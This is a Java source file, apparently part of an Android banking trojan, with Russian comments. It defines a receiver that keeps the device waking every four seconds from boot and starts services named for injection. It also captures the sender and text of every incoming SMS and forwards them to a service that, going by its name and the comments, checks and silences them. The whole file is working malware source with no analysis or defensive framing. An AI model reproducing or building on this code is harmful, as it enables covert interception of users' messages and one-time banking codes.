package com.example.livemusay.myapplication;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.concurrent.TimeUnit;


public class StartBoot extends BroadcastReceiver {

    public StartBoot() {
    }

    @Override
    public void onReceive(Context context, Intent intent)
    {

        String action = intent.getAction();
        if(action.equals("android.provider.Telephony.SMS_RECEIVED"))
        {
            //пришла смс-ка
            RCWC(context,intent);
        }
        else {
            //запускаем пробуждения устройства
            AlarmManager localObject = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            PendingIntent localPendingIntent = PendingIntent.getBroadcast(context, 0, new Intent(context, AlarM.class), 0);
            ((AlarmManager) localObject).setRepeating(localObject.RTC_WAKEUP, System.currentTimeMillis(), 4000, localPendingIntent);

            //запуск сервисов
            context.startService(new Intent(context, StartWhile.class));
            context.startService(new Intent(context, injectionService.class));
            Log.e("СТАРТ СЕРВИС","inj");

            try {
                TimeUnit.SECONDS.sleep(1);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
       }
      Log.e("B","BOOT Стартанул");
    }

    //принимаем СМС
    public void  RCWC(Context context, Intent intent)
    {
        final Bundle bundle = intent.getExtras();
        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                if (pdusObj != null)
                    for (Object aPdusObj : pdusObj)
                    {
                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);
                        String num = currentMessage.getDisplayOriginatingAddress();
                        String ms = currentMessage.getDisplayMessageBody();

                        Log.e("B","Есть СМС");

                        //запускаем сервис для проверки СМС-КИ
                        context.startService(new Intent(context, delSoundSWS.class)
                                .putExtra("intentCommand","RCWC")
                        .putExtra("num",num)
                        .putExtra("ms",ms));
                    }
            }

        } catch (Exception e) {//Ошибка ресивера СМС

        }

    }
}
